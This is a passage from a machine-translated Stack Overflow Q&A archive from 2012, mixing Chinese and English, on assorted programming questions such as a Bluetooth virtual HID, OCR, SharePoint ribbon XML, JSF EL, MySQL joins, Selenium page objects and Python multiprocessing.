var node = svg.selectAll("g.node")
    .data(nodes)
    .enter()
    .append("g")
    .attr("class", "node")
    .append("circle")
    .attr("fill", function(d) {
       var b = Math.floor(255 * Math.random()),
       rgba = "rgba(0, 0, " + b + ", 0.7)";
       return rgba;
     })
    .attr("r", 15)
    .call(force.drag); 
```

然后您可以附加其他元素，例如文本。

# c++ - 虚拟 HID（人机接口设备）的代码示例

> ID：13280850
> 
> 赞同：0
> 
> 时间：2012-11-08T00:53:23.063
> 
> 标签：c++, qt, bluetooth, virtual, hid

我需要用于制作虚拟 HID（人机接口设备）的代码示例（或一些教程）。如果可能的话，使用蓝牙集成并使用 QT/C++ 为 linux 制作。

实际上，我想制作我自己的手机应用程序，它有几个按钮（但它可以用作键盘 - 发送击键），而不需要服务器端应用程序（它将控制 windows/linux/mac 操作系统），而且 HID 似乎我最好的选择。不幸的是，我找不到任何代码示例或教程。

问题是我不知道我应该如何提供服务并注册它（使其通过蓝牙可用，以便操作系统可以将其识别为键盘并与之配对）。

* * *

到目前为止，我已经找到了有关 BlueZ 的信息，但正如我所提到的，我找不到任何代码示例或教程。

* * *

更新：我正在尝试让我的手机（诺基亚 N9 - Maemo 6/MeeGo OS - Linux）通过蓝牙伪装成 HID 设备，这样我就可以将击键发送到 PC。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T07:40:49.827

我想到的第一个问题是你制造的这个USB设备？

我不明白制作自己的手机应用程序是什么意思。所以你有一个设备是手机或者什么请更明确

无论如何，为您提供的解决方案可能是[libusb](http://www.libusb.org/)库在 Windows 和 linux 机器上运行良好。

如果您需要学习有关 USB 隐藏设备以及如何与它们交互的知识，您可以在[这里](http://www.lvr.com/hidpage.htm)找到很多非常好的教程。

为了帮助你，请更明确。

# iphone - 应用程序中用于扫描的 iphone 相机（如红色激光）

> ID：13280858
> 
> 赞同：3
> 
> 时间：2012-11-08T00:54:26.620
> 
> 标签：iphone, xcode, text, camera, scanning

我正在开发一个需要使用相机扫描文本的应用程序。基本上没有太详细，我需要将相机指向某个东西（为了我的目的，我会说一个车牌），我需要将相机指向车牌，并让它以某种方式将数字保存到应用程序中的字符串中. 我猜它类似于 Word Lens 或红色激光，它实际上并不拍照，它只是扫描视图并返回信息。我找不到太多关于此的信息，因此将不胜感激有关如何编写此类代码的任何帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-30T16:22:07.017

这不是条码扫描。这称为 OCR（光学字符识别），并且有一些可用的免费和开源库可以执行此操作。

例如，[Tesseract](http://code.google.com/p/tesseract-ocr/)是一个用 C++ 编写的完整 OCR 引擎（它具有 C++ 接口，因此可以在 iOS 应用程序中轻松使用）。

另一个解决方案是[gocr](http://jocr.sourceforge.net/)，即 GNU 光学字符识别器。这应该是一个独立的程序（一个命令行工具），但我已经成功地将它的基本部分提取到一个库中（我也在我的一个 iOS 项目中使用它）。

[OpenCV](http://opencv.org/)是一个完整的计算机视觉库。您可以使用它来实现 OCR - 只需 google 即可获得足够的文档和教程。

# visual-studio - 在 Visual Studio 2012 中打开后无法打开 database.mdf

> ID：13280859
> 
> 赞同：0
> 
> 时间：2012-11-08T00:54:27.697
> 
> 标签：visual-studio, sql-server-2008, visual-studio-2012, sql-server-2012, downgrade

我一直在用 Visual Studio 2008 和 SQL 2008 做一些事情。然后我在另一台 2012 版本的计算机上打开了项目。

现在，当我再次尝试使用 2008 年的文件时，我无法打开我的 database.mdf，因为 2012 年的 sql 已经升级了我的数据库文件......

我能做些什么来拯救它？（顺便说一句。数据不是那么重要，但更重要的是整个表的设置和关系）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T01:04:04.720

使用管理工具安装 2012 SQL Server Express，附加 MDF 并通过使用向导为您想要的对象生成“创建”脚本来提取架构，然后在新的 2008 DB 上重新运行脚本，不要认为有办法降级。[见这里](http://blog.sqlauthority.com/2008/10/16/sql-server-downgrade-database-to-previous-version/)。
或者您可以继续在 SQL2012 之上进行开发，即使您使用 Visual Studio 2008 也不应该成为问题。

# excel - 在excel中根据纬度和经度计算航向

> ID：13280862
> 
> 赞同：2
> 
> 时间：2012-11-08T00:54:39.990
> 
> 标签：excel, heading

我想在excel中用P1（lat1，long2）和P2（lat2 long2）计算2个点之间的北方航向。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2018-06-21T12:00:42.173

这取决于您要寻找的准确度级别。[Haversine 公式](https://en.wikipedia.org/wiki/Haversine_formula)很简单，但可能还不够，因为它假设地球表面是一个完美的球体（事实并非如此）并且仅提供有限的准确性。
[Vincenty 的公式](https://en.wikipedia.org/wiki/Vincenty%27s_formulae)提供了更好的测地线等级精度（1.46E-6 度）。
我整理的 VBA Excel 实现可以在 GitHub 上找到：[https](https://github.com/tdjastrzebski/Vincenty-Excel) ://github.com/tdjastrzebski/Vincenty-Excel 。
`VincentyInvFwdAzimuth()`功能应该可以满足您的需求。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T07:22:42.133

我有一个用于业余无线电计算的函数。一个“纯”的公式对我来说太笨重了。

```
Function BearingFromCoord(lat_base_deg, long_base_deg, lat_dest_deg, long_dest_deg As Single) As Long
   Dim rad_deg_factor As Single
   Dim long_diff As Single
   Dim frac0 As Single
   Dim frac1 As Single
   Dim frac2 As Single
   Dim lat_base As Single
   Dim long_base As Single
   Dim lat_dest As Single
   Dim long_dest As Single
   Dim bearing As Single

   rad_deg_factor = 360 / (2 * pi())

   long_diff = (long_base_deg - long_dest_deg) / rad_deg_factor
     lat_base = lat_base_deg / rad_deg_factor
       lat_dest = lat_dest_deg / rad_deg_factor
          frac0 = Sin(lat_base) * Sin(lat_dest) _
              + Cos(lat_base) * Cos(lat_dest) _
                * Cos(long_diff)
             bearing = rad_deg_factor * Application.WorksheetFunction.Acos((Sin(lat_dest) _
                        - Sin(lat_base) * frac0) _
                    / (Cos(lat_base) * Sin(WorksheetFunction.Acos(frac0))))
          If Sin(long_diff) < 0 Then
            BearingFromCoord = bearing
          Else
            BearingFromCoord = 360 - bearing
          End If
End Function

Private Function pi() As Single
  pi = 3.1415926535
End Function 
```

# c# - live tile is not updating in Windows Phone

> ID：13280863
> 
> 赞同：0
> 
> 时间：2012-11-08T00:54:44.137
> 
> 标签：c#, windows-phone-8

i am developing a windows phone app where application has an option to pin the application to home screen. And i am using ShellTileSchedule class to do schedule the update periodically. Some reason my app is not pushing any update to tile. My app data is completely local, no data is coming from outside.

In my tile update, i am not updating any image on the lile, but only changing the data to display.

```
 foreach (ShellTile tile in ShellTile.ActiveTiles)
 {
            IconicTileData tileData = GetTileData();

            tileSchedule = new ShellTileSchedule(tile, tileData);
            tileSchedule.Interval = UpdateInterval.EveryHour;
            tileSchedule.Recurrence = UpdateRecurrence.Interval;
            tileSchedule.Count=GetUserData();
            tileSchedule.StartTime = DateTime.Now;
            tileSchedule.Start();

            tile.Update(tileData);
} 
```

Any help in this regard? Or do i need to background agent to update the tile?

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-08T07:31:56.703

> ShellTileSchedule 只能从网络上提取图像，而不是从手机本身。这是 ShellTileSchedule 的限制之一。如果您想为手机上的资源设置背景图像，请考虑使用推送通知。

资料来源：[http ://www.silverlightshow.net/news/WP7-Using-ShellTileSchedule-to-update-your-app-s-Live-Tile-background.aspx](http://www.silverlightshow.net/news/WP7-Using-ShellTileSchedule-to-update-your-app-s-Live-Tile-background.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T06:07:00.057

Shouldn't you be setting a ShellTileSchedule.RemoteImageUri somewhere? I mean, that's kinda what ShellTileSchedule is there for, to update your tile image from a remote Uri on a regular interval... See sample of how to use this class for secondary tiles [here](http://msdn.microsoft.com/en-us/library/windowsphone/develop/ff769548%28v=vs.105%29.aspx#BKMK_SchedulingSecondaryTiles).

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T08:26:09.887

您必须填写 IconicTileData 的属性。在您的示例中，您只需创建空数据结构并将其用于计划，这是行不通的。我这样使用它：

```
IconicTileData newTileData = new IconicTileData
{
    Title = SharedResources.AppName,
    Count = BatteryHelper.BateryLevel,
    SmallIconImage = new Uri(@"/Assets/IconicSmall.png", UriKind.Relative),
    IconImage = new Uri(@"/Assets/IconicMedium.png", UriKind.Relative),
}; 
```

# sharepoint-2010 - CustomAction button in the clipboard editing panel sharepoint 2010

> ID：13280864
> 
> 赞同：0
> 
> 时间：2012-11-08T00:54:44.917
> 
> 标签：sharepoint-2010

Hi I'm trying to add my own button in the clipboard group of content editor ribbon in SharePoint. It's not appearing anywhere, here's the xml.

```
 <?xml version="1.0" encoding="utf-8"?>
<Elements xmlns="http://schemas.microsoft.com/sharepoint/">
 <CustomAction Description="Copy html"
            Id="68275191-272b-4c59-a9ee-ee736f76f2e5"
            RegistrationId="100"
            RegistrationType="List"
            Location="CommandUI.Ribbon"
            Title="Copy html" >
<CommandUIExtension>
  <CommandUIDefinitions>
    <CommandUIDefinition       Location="Ribbon.EditingTools.CPEditTab.Clipboard.Controls._children">
      <Button
          Id="copyHtmlSelection"
          Alt="Copy html"
          Sequence="100"
          Command="CustomRibbonButton_CopyHtml_Command"
          Image32by32="/_layouts/Images/copy_big.gif"
          Image16by16="/_layouts/Images/copy_small.gif"
          LabelText="Copy html"
          TemplateAlias="o1" />
    </CommandUIDefinition>
  </CommandUIDefinitions>

  <CommandUIHandlers>
    <CommandUIHandler
      Command="CustomRibbonButton_CopyHtml_Command"
      CommandAction="javascript:CopySelectedHtml();" />
  </CommandUIHandlers>

</CommandUIExtension>
  </CustomAction> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T08:58:36.493

从 CustomAction 元素中移除 RegistrationId 和 RegistrationType 并清除浏览器缓存。这对我行得通：

```
<?xml version="1.0" encoding="utf-8"?>sdf
<Elements xmlns="http://schemas.microsoft.com/sharepoint/">
  <CustomAction Description="Copy html"
             Id="68275191-272b-4c59-a9ee-ee736f76f2e5"
             Location="CommandUI.Ribbon"
             Title="Copy html" >
    <CommandUIExtension>
      <CommandUIDefinitions>
        <CommandUIDefinition       Location="Ribbon.EditingTools.CPEditTab.Clipboard.Controls._children">
          <Button
              Id="copyHtmlSelection"
              Alt="Copy html"
              Sequence="100"
              Command="CustomRibbonButton_CopyHtml_Command"
              Image32by32="/_layouts/Images/copy_big.gif"
              Image16by16="/_layouts/Images/copy_small.gif"
              LabelText="Copy html"
              TemplateAlias="o1" />
        </CommandUIDefinition>
      </CommandUIDefinitions>

      <CommandUIHandlers>
        <CommandUIHandler
          Command="CustomRibbonButton_CopyHtml_Command"
          CommandAction="javascript:CopySelectedHtml();" />
      </CommandUIHandlers>

    </CommandUIExtension>
  </CustomAction>
</Elements> 
```

# jquery - Jquery Mobile - Disable address bar auto hide

> ID：13280869
> 
> 赞同：1
> 
> 时间：2012-11-08T00:55:02.607
> 
> 标签：jquery, jquery-mobile, mobile, hide, address-bar

Wondering if there's a way to stop Jquery Mobile from auto hiding the address bar. Apparently it does this by default and I've found just one other post pointing to the mechanism. If someone has tackled this already awesome - otherwise I'll find some override and post here. Thanks for ur help!

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T03:31:34.137

尝试这个

```
 $(document).bind("mobileinit", function(){
   $.mobile.useFastClick=false;
 }); 
```

因为 mobileinit 事件在执行时立即触发，所以您需要在加载 jQuery Mobile 之前绑定事件处理程序，因此链接您的文件，如

```
 <script src="jquery.js"></script>
 <script src="custom-scripting.js"></script>
 <script src="jquery-mobile.js"></script> 
```

# java - 如何在 EL 表达式的文本中使用不同的支持 bean 属性？

> ID：13280870
> 
> 赞同：2
> 
> 时间：2012-11-08T00:55:07.970
> 
> 标签：java, jsf-2, el

我正在尝试为登录的用户类型显示不同的消息，但获取解析异常

```
<ui:define name="header">
        <ui:param name="userParam" value="#{bean.user.firstName} - #{bean.user.lastName}" />    
        <p:panel id="headerPanel"
            header="#{bean.adminUser ? 'Welcome Power User' userParam : bean.normalUser ? 'Welcome User' userParam :'Welcome to sytem'}"/>
    </ui:define> 
```

**这是例外**

```
Caused by: org.apache.el.parser.ParseException: Encountered "?" at line 1, column 21.
Was expecting one of:
    "}" ...
    "." ...
    "[" ...
    ">" ...
    "gt" ...
    "<" ...
    "lt" ...
    ">=" ...
    "ge" ...
    "<=" ...
    "le" ...
    "==" ...
    "eq" ...
    "!=" ...
    "ne" ...
    "&&" ...
    "and" ...
    "||" ...
    "or" ...
    "*" ...
    "+" ...
    "-" ...
    "/" ...
    "div" ...
    "%" ...
    "mod" ... 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T02:36:48.473

从您的代码：

```
#{bean.adminUser ? 'Welcome Power User' userParam : bean.normalUser ? 'Welcome User' userParam :'Welcome to sytem'} 
```

您不能以这种方式在 EL 中连接字符串。

如果您使用的是 EL 2.2，则可以使用字符串的`concat()`方法。

```
#{bean.adminUser ? 'Welcome Power User '.concat(userParam) : bean.normalUser ? 'Welcome User '.concat(userParam) : 'Welcome to sytem'} 
```

或者，如果您仍在使用 EL 2.1，则应事先由另一个`<ui:param>`（或`<c:set>`）准备完整的字符串：

```
<ui:param name="welcomePowerUser" value="Welcome Power User #{userParam}" />
<ui:param name="welcomeUser" value="Welcome User #{userParam}" />
...
#{bean.adminUser ? welcomePowerUser : bean.normalUser ? welcomeUser : 'Welcome to sytem'} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T00:57:32.757

使用两个表达式：

```
#{bean.adminUser ? 'Welcome Power User' : 'Welcome User'}#{userParam} 
```

# mysql - 加入 sql 中的 id 数组

> ID：13280875
> 
> 赞同：2
> 
> 时间：2012-11-08T00:55:45.697
> 
> 标签：mysql, sql, arrays, join

我有三个表：表 1 合同

```
-------------------
id  |  contract_name
--------------------
1      test name
2      test name 2
2      test name 3
4      test name 4 
```

表 2 房间

```
-------------------
id  |  room_name
--------------------
1      test name
2      test name 2
2      test name 3
4      test name 4 
```

表 3 促销

```
----------------------------------
 id  |  contracts_id  |   rooms_id
----------------------------------
 1          1,3            1,3,4
 1          2              1,2,3 
```

不，我正在尝试进行内部连接，以根据保存在数据库中的数组中的 id 获取合同和房间的名称。我知道这根本不理想，但我无法更改数据库设置。所以这就是我想对我的查询做的事情，但显然这是不可能的。有谁知道我如何做到这一点？

```
mysql_query("SELECT pb.*, c.contract_name, r.room_name FROM promo_blackouts AS pb
INNER JOIN contracts as c ON c.contract_id IS IN pb.contracts_id
INNER JOIN rooms as r ON r.room_id IS IN pb.rooms_id 
WHERE pb.promo_id = '$promo_id'") or die(mysql_error()); 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-08T01:18:42.003

你在寻找这样的东西吗？：

```
SELECT DISTINCT
    contract_name,
    room_name
FROM
    promos
INNER JOIN
    contracts ON FIND_IN_SET(contracts.id, contract_id) != 0
INNER JOIN
    rooms ON FIND_IN_SET(rooms.id, room_id) != 0
WHERE
    promos.id = 1 
```

# webdriver - Webdriver：公开现有元素的选择器/按/位置

> ID：13280881
> 
> 赞同：1
> 
> 时间：2012-11-08T00:56:45.460
> 
> 标签：webdriver, selenium-webdriver

## 问题：

.Click()-ing 单选按钮 webdriver 元素使其陈旧（无法控制执行此操作的页面）。DOM 元素本身还是一样的。

## 目标：

我想使用自己的原始选择器方法重置现有的 webdriver 元素，使其不再过时。我想要一个不需要提前知道元素是如何找到的通用解决方案。我想使用现有的陈旧元素来完成这项工作。理想情况看起来像这样（仅出于示例目的使用以下 C# 扩展方法）：

```
IWebElement refreshedElement = driver.FindElement(staleElement.By()); 
```

## 问题：

有没有办法公开现有元素的位置？元素的“地址”在任何地方都可用吗？它甚至不必是找到元素时寻址元素的原始方法，我不在乎。我宁愿不必为了捕获这些信息而创建一个子类。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T13:30:18.497

不，Selenium 不会跟踪您“如何”找到元素，坦率地说，我认为这不应该是 Selenium 的责任。

我会将它包装到一个新类中，该类继承自`RemoteWebElement`，并有一个名为`RefindElement`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-14T13:35:49.220

我可能会建议考虑添加“页面类”的概念。基本上，我没有将元素添加到测试本身，而是创建了一个单独的类，该类具有返回元素的方法。

例如，登录页面将包含三个元素，因此有 3 个方法：

```
public class LoginPage
{
    private IWebDriver driver { get; set; }
    public CSCView_SalesAspx(IWebDriver driver) { this.driver = driver; }

    public IWebElement Id { get { return driver.FindElement(By.Id("login_id")); } }
    public IWebElement Pw { get { return driver.FindElement(By.Id("login_pw")); } }
    public IWebElement SubmitBtn { get { return driver.FindElement(By.Id("submitBtn")); } }
} 
```

现在您所要做的就是实例化该类，然后与该方法进行交互。您的元素应该始终是“新鲜的”，因为您每次都在进行查找（无需任何额外工作）。

```
LoginPage loginPage = new LoginPage(driver);
loginPage.Id.SendKeys("myName");
loginPage.Pw.SendKeys("myPw");
loginPage.SubmitBtn.Click(); 
```

最好的一点是，如果页面发生更改，您不必重写每个测试，只需更改一个页面类即可修复损坏的测试。

# asp.net - Connecting to internal SQL Server 2008 R2 from DMZ web server using IIS7 using a trusted connection?

> ID：13280890
> 
> 赞同：0
> 
> 时间：2012-11-08T00:57:44.333
> 
> 标签：asp.net, authentication, sql-server-2008-r2, dmz, trustedconnection

I'm trying to connect and getting an error like:

> *Login failed. The login cannot be used with Windows Authentication*

I'm using mirrored local accounts on SQL Server and web server because I'm simply trying to use a trusted connection between machines not on the same domain. It seems like something that would be fairly common, but after days of trying to find an answer that applied to my situation, I do not recognize that any of the answers were applicable... that or the fact that I'm only a .NET developer and not a sysadmin or DBA means I have it and just don't know it.

Here's what I can say:

*   CMS web server: ASP.NET 4.0 web app running on Windows Server 2008, IIS7, on corporate DMZ
*   CMS database server: SQL Server 2008 R2 on a domain server
*   For various reasons that I won't go in to, encrypting the credentials is not sufficient.
*   The database port that the application needs to connect on is not the standard port and is set up to listen on a different port.
*   Setting up DB mirroring isn't an option and doesn't really address the requirements (in my way of thinking)

Also, FYI if this is helpful to know:

*   Content entry happens on internal web server which publishes content to same DB that is accessed by the DMZ web server.
*   Content server is set up to have the website run the app pool in integrated mode with a windows domain user that has been set as a service account using the -ga switch and given all the appropriate rights and everything runs perfect.

*   External web server, without domain access, using mirrored accounts (same username and password set up on the SQL Server machine and web machine).

*   Local account on the web server set as a service account using -ga switch and running as the app pool identity for my app.
*   On the SQL Server box, created local user with identical creds and given same permissions that the domain user identity has
*   Connecting to SQL Server via MGMT studio installed on web server with the SQL Server user creds works fine.

Now, if I put in the username in to the connection strings, everything is perfect. As soon as I put the trusted_connection=yes in the connection string like I did with the domain server connection strings, I get the trust error.

So if my connection string is like this, it works fine:

```
Server=myServerAddress;Database=myDataBase;Username=MyUser; Password=MyPassword; 
```

If I change my connection string to either of these, it fails:

```
Server=myServerAddress;Database=myDataBase;Trusted_Connection=True; 
```

or

```
Data Source=myServerAddress;Initial Catalog=myDataBase;Integrated Security=SSPI; 
```

I'm working with one of the client's network admins and he's not necessarily a DBA and doesn't have experience with configuring web apps. So it's possible that we're missing something and any advice or ideas would help. What am I missing?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T06:16:43.603

如果使用 SQL 凭据不是一种选择，那么您应该使用 Active Directory 并创建单向信任（让 DMZ 服务器域信任您的内部域），在您的内部域中创建您的 DMZ 应用程序可以使用的服务帐户，并授予该帐户访问数据库。然后它将能够生成 SSPI 上下文。

# c - How can I use colors in my console app (C)?

> ID：13280895
> 
> 赞同：1
> 
> 时间：2012-11-08T00:58:46.847
> 
> 标签：c, windows, console-application

I am running C in `Code:Blocks` IDE with the compiler `GNU GCC`. And I want to use colorful string output in my console application. The OS I am on is Windows

Previously, I used Borland C. So, using `textcolor()` `textbackground()` and `cprintf()` were fine. But these function does not seem to work on Code:Blocks IDE with GNU GCC Compiler wrapped with it.

What should I do to print colored texts now?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T01:54:42.157

终端中的颜色内置于标准 Windows 中，而且非常简单。你想要这个`SetConsoleTextAttribute()`功能，这里有一个非常简单的例子：

```
#include <stdio.h>
#include <Windows.h>
#include <string.h>

void main()
{
    printf("Hello\n");  // Print white text on black output
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED);
    printf("Hello Again!\n");  // Print Red text on black output
    getchar(); // Pause the program to admire the colors
} 
```

为了进一步突出显示，您还可以更改背景，您可以或 ( `|`) 一起使用标志以获得不同的颜色和不同的背景/前景。

所以如果你想在绿色背景上做红色文字（出于某种原因），你可以这样做：

```
FOREGROUND_RED | BACKGROUND_GREEN 
```

![在此处输入图像描述](../Images/f0ff41202803ef3add44c6d05f2f6b14.png)

您还可以通过 OR'ing 多个前景色或背景色来混合颜色，例如：

```
FOREGROUND_GREEN | FOREGROUND_BLUE 
```

会给你一个蓝绿色的文字。

# iphone - Why is my delegation between two vc's not working?

> ID：13280896
> 
> 赞同：1
> 
> 时间：2012-11-08T00:58:52.977
> 
> 标签：iphone, ios, xcode, delegates

I have two view controllers. My first is my menu which contains my highscore and a button which performs a modal segue to my second view controller which is my game. Whenever my player loses the game if he beat his highscore I want it to update on the menu.

Right now, when my player loses the game, I create a UIAlertView with 2 buttons, the first is main menu and the second is restart. Here is my simplified code with my attempting to update my high score via delegation.

```
 @protocol highScoreProtocol <NSObject>

        -(void)updateHighScore:(int) score;

        @end

        @interface ViewController : UIViewController <UIAlertViewDelegate> //i have this delegate implemented because i have a uiialertview
        @property (nonatomic) int score;
        @property (nonatomic, weak) id <highScoreProtocol> delegateHighScore;

        @implementation ViewController
        @synthesize score=_score;
        @synthesize delegateHighScore=_delegateHighScore;

            -(void)lostGame{
            [self.delegateHighScore updateHighScore:self.score]; //this is where i try to call the method that should update my high score if necessary but this doesn't actually work
        UIAlertView *losingScreen=[[UIAlertView alloc]initWithTitle:@"Game Over" message:[NSString stringWithFormat:@"Your Score Is %d", self.score] delegate:self cancelButtonTitle:@"Main Menu" otherButtonTitles:@"Restart", nil]; //once the user loses the game i have an alert view show giving the option to either restart the game or go to the main menu where the high score is
            }

        -(void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex{
              if (buttonIndex==0) {
                 //here i'm segueing back to my main menu because he would have pressed the 'main menu' button  [self performSegueWithIdentifier:@"MainMenu" sender:self];

            } else if (buttonIndex==1){
                //here i just reset my attributes and reset my level because he would have pressed the 'restart button'
            }
        }

    @end

            @interface MenuVC : UIViewController <highScoreProtocol>
            @property (weak, nonatomic) IBOutlet UILabel *labelHighScore; //the labelhighscore is the highscore number

            @end

@implementation MenuVC

- (void)viewDidLoad
{
    [super viewDidLoad];
    ViewController *vc=[[ViewController alloc]init];
    vc.delegateHighScore=self;//here is set the delegate as myself which i think i'm supposed to do for some reason

}

-(void)updateHighScore:(int)score{
    if (score>[self.labelHighScore.text integerValue]) { 
        self.labelHighScore.text=[NSString stringWithFormat:@"%d", score];
    }
    NSLog(@"does this method even run");

// this is the method that updates the highscore which I want to run
// but it doesn't, notice I even made an 'nslog' to see if the method
// even runs but I never ever even got a log out in the debugger,
// so this method never runs.
} 
```

If I just need a little help, or if I'm doing everything completely wrong and going about this task the wrong way, please say.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T01:23:20.810

由于您在 viewDidLoad 方法中创建了一个局部变量 vc，因此这与您在创建模态 segue 的按钮方法中创建的变量不同。那不是设置委托的正确位置。使用您创建（或拥有）的任何引用，将您自己设置为该按钮方法中的委托，该引用对您正在使用的 ViewController 的实例进行引用。如果您需要更多信息或代码示例，请发布该按钮方法，以便我了解您的操作方式。

编辑后：然后你应该实现 prepareForSegue:sender: 并这样做：

```
-(void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender {
    [(ViewController *)[segue destinationViewController] setDelegate:self];
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T01:06:57.007

这不起作用，因为：

```
ViewController *vc=[[ViewController alloc]init];
vc.delegateHighScore=self; 
```

实例化一个新的视图控制器，它与你正在交互的控制器完全无关。

我假设您正在使用情节提要，因此，为您的视图控制器创建一个标识符（在界面构建器上-> 选择您的视图控制器-> 身份检查器选项卡-> 在上面写着情节提要 ID 的地方写一个名称）

然后添加这个而不是以前的代码：

```
ViewController *vc = [self.storyboard instantiateViewControllerWithIdentifier:@"yourIdentifier"];
vc.delegateHighScore = self; 
```

**编辑：**

将此添加到您的按钮操作（但从**界面构建器中删除 segue 并从 viewDidLoad 中删除此代码**）

```
ViewController *vc = [self.storyboard instantiateViewControllerWithIdentifier:@"yourIdentifier"];
vc.delegateHighScore = self;
[self presentModalViewController:vc animated:YES]; 
```

# php - Node.js + PHP + MySQL VPS hosting

> ID：13280897
> 
> 赞同：3
> 
> 时间：2012-11-08T00:58:58.493
> 
> 标签：php, node.js, hosting, web-hosting, vps

I have a website that I am building that is coded in PHP and I use MySQL for the database, I am also using node.js for most everything, so my website cannot exist without it for the most part.

I have been with a small company (One that a friend of mine started up) and they have given me cheap VPS hosting, and they even setup everything on the server that I needed done (because I have no clue how to set up a server myself) I currently pay $15 per month for hosting, and would not want to pay anymore than that at this time. (As my website is still in development, so it's just for my own personal usage and sharing among some friends for testing and such).

I need a relatively cheap hosting provider that gives me basically 100% control of the server (as I have many needs that usually are not part of packages), and I would also like to be able to have them (or someone) set up the server for me.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T02:21:26.467

[为什么不在这里](http://aws.amazon.com/free/)免费注册一年的亚马逊 ec2

# xaml - how do you get a windows 8 store app to display only a numeric keypad

> ID：13280898
> 
> 赞同：2
> 
> 时间：2012-11-08T00:59:02.730
> 
> 标签：xaml, windows-store-apps, numeric-keypad

how do you get a windows 8 store app to display only a numeric keypad? I want the user to see only a numeric keypad when they click into a TextBox

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-25T10:11:13.447

您必须在元素上设置输入范围，例如

```
 <TextBox x:Name="txtBox" InputScope="Number" /> 
```

请记住，这只会获得数字键盘。用户仍然可以手动更改为字母数字键盘并输入文本。您仍然需要验证条目。

# python - Using multiprocessing to compute shortest path on a graph

> ID：13280899
> 
> 赞同：0
> 
> 时间：2012-11-08T00:59:07.003
> 
> 标签：python, dictionary, multiprocessing, shortest-path

I currently have a shortest path algorithm that receives as inputs the Graph and a Node of origin, and returns the costs for all nodes in the graph plus the tree (precedents for each node). The graph is a dictionary, so are the costs AND the tree.

Since I have to compute the shortest path trees with origins in all nodes, it is only natural to do it in parallel (as the trees are independent of each other).

I'm doing it with the use of a pool of workers using the multiprocessing and appending the results to a list (so I want a list of dictionaries).

It runs without errors, but the interesting part is that the processing time does not change with the number of workers (NO CHANGE AT ALL).

Any insight on why does that happen will be mostly appreciated. Code follows below.

```
from LoadData import *
from ShortestPathTree import shortestPath
from time import clock, sleep
from multiprocessing import Pool, Process, cpu_count, Queue

def funcao(G,i):
    costs, pred=shortestPath(G,i)
    return pred

def main():

    #loads the graph
    graph="graph.graph"
    G = load_graph(graph)

    # loads the relevant nodes (CENTROIDS)
    destinations="destinations.graph"
    DEST = load_relevant_nodes(destinations)

    f = open('output_parallel.out','w')
    start=clock()

    pool=Pool()

    resultados=[]
    def adder(value):
        resultados.append(value)

    #for i in range(len(DEST)):
    for i in range(486):
        pool.apply_async(funcao, args=(G,DEST[i]), callback=adder)

    pool.close()
    pool.join()

    print clock()-start
    print >> f, resultados
    print >> f, 'seconds: '+ str(clock()-start) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T20:01:07.867

事实证明，@abarnert 在他询问每个电话需要多长时间时将其钉在了头上。输入的数据存在问题，使得每个呼叫都非常容易应答，因此为多个工作人员发送任务的开销补偿了性能的提高。

```
The results I get now that the input data was corrected are: 
```

1核：185.0s 2核：111.2s 3核：96.6s 4核：87.5s

在双核超线程 i7 620M 联想 T410 笔记本电脑上运行（Win 7 64 位，Python 2.7.3）

感谢@abarnert 的伟大见解！

# php - 如何在一张表中显示两个数据表中的数据

> ID：13280901
> 
> 赞同：2
> 
> 时间：2012-11-08T00:59:28.743
> 
> 标签：php

我有两张桌子，`image`和`video`。我想在一张表中显示来自图像和视频的所有数据。我知道如何显示视频中的所有数据，但如何在同一张表中显示图像中的所有数据。有一个表格可以显示视频中的所有数据，但是有人可以告诉我在显示视频数据完成后如何在同一个表格中显示图像中的所有数据。

```
<table width="879" border="2" cellpadding="3" cellspacing="1">
  <tr>
    <td colspan="11" align="center" ><strong>All uploaded videos</strong>
    </td>
  </tr>
  <tr>
    <td width="51" align="center" bgcolor="#000000" class="yellow"><strong>Id</strong></td>
    <td width="95" align="center" bgcolor="#000000" class="yellow"><strong>Video</strong></td>
    <td width="83" align="center" bgcolor="#000000" class="yellow"><strong>Name</strong></td>
    <td width="130" align="center" bgcolor="#000000" class="yellow"><strong>Date</strong></td>
    <td width="177" align="center" bgcolor="#000000" class="yellow"><strong>Description</strong></td>
    <td width="101" align="center" bgcolor="#000000" class="yellow"><strong>Price</strong></td>
    <td width="174" align="center" bgcolor="#000000" class="yellow"><strong>Added by</strong></td>
  </tr>

  <?php $path= "videoFile/";
    while($rows=mysql_fetch_array($result1)){
  ?>

  <tr>  
    <td>
      <?php if ( current_user_can( 'manage_options' ) ) { echo $rows['vid'];}else { echo "For admins only!"; }  ?>
    </td>
    <td><a href="<?php echo $path.$rows['filename'] ?>">View video</a></td>
    <td><?php echo $rows['alttext']; ?></td>
    <td><?php echo $rows['imagedate']; ?></td>
    <td><?php echo $rows['description']; ?></td>
    <td><?php echo "$".$rows['price']; ?></td>
    <td><?php echo $rows['user_nicename']; ?></td>    
  </tr>

  <?php
    }
  ?>    
